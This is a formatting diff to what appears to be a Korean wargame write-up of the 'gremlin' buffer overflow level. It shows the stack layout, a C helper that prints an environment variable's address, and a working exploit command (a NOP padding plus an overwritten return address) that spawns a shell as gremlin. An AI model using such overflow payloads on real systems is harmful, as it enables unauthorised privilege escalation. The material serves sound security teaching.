@@ -60,15 +60,15 @@ Memory Structure
 
 .. code-block:: console
 
-	===============
-	LOW     
-	---------------
-	Buffer  (256byte) <- argv[1]
-	SFP     (4byte)
-	RET     (4byte)
-	---------------
-	HIGH    
-	===============
+    ===============
+    LOW     
+    ---------------
+    Buffer  (256byte) <- argv[1]
+    SFP     (4byte)
+    RET     (4byte)
+    ---------------
+    HIGH    
+    ===============
 
 |
 
@@ -111,10 +111,10 @@ exploit
     #include <stdio.h>
     int main(int argc, char **argv)
     {
-	    char *addr;
-	    addr = getenv(argv[1]);
-	    printf("address %p\n", addr);
-	    return 0;
+        char *addr;
+        addr = getenv(argv[1]);
+        printf("address %p\n", addr);
+        return 0;
     }
 
 .. code-block:: console
@@ -134,7 +134,7 @@ RET 주소를 환경 변수 주소로 변경하여 공격 진행
 .. code-block:: console
 
     $ ./gremlin `python -c 'print "\x90"*260+"\x4c\xfc\xff\xbf"'`
-    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+    
     bash$ whoami
     gremlin
     bash$ my-pass
